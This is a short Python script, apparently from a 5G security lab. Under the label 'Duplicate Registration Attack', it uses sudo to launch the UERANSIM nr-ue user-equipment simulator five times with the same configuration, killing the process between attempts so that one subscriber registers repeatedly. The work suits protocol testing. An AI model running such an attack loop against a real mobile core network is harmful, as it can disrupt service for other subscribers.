import subprocess
import time
from pathlib import Path

UERANSIM = Path.home() / "5g-project" / "UERANSIM"

NR_UE = UERANSIM / "build" / "nr-ue"

CONFIG = UERANSIM / "config" / "generated" / "ue001.yaml"

print("Authenticating sudo...")
subprocess.run(["sudo", "-v"], check=True)

print("=" * 60)
print("Duplicate Registration Attack")
print("=" * 60)

for i in range(5):

    print(f"Registration Attempt {i+1}")

    p = subprocess.Popen([
        "sudo",
        "-n",
        str(NR_UE),
        "-c",
        str(CONFIG)
    ])

    time.sleep(2)

    subprocess.run([
        "sudo",
        "pkill",
        "-f",
        "nr-ue"
    ])

    time.sleep(1)

print("Attack Finished.")